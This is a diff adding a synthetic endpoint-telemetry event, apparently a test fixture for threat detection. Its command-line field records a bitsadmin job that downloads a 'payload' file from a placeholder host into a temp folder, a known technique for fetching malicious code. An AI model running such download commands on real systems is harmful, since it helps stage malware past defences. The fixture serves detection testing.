@@ -1,0 +1,16 @@
+{
+  "schema_version": 1,
+  "synthetic": true,
+  "event": {
+    "TimeGenerated": "2026-09-03T09:20:00Z",
+    "Timestamp": "2026-09-03T09:20:00Z",
+    "DeviceId": "synthetic-device-0025",
+    "DeviceName": "endpoint.example.invalid",
+    "AccountName": "synthetic-user",
+    "InitiatingProcessFileName": "cmd.exe",
+    "FileName": "BITSADMIN.EXE",
+    "FolderPath": "C:\\Windows\\System32\\bitsadmin.exe",
+    "ProcessCommandLine": "BITSADMIN.EXE /CREATE SyntheticJob /ADDFILE SyntheticJob HTTPS://example.invalid/payload.dat C:\\Temp\\payload.dat",
+    "ReportId": 2025
+  }
+}
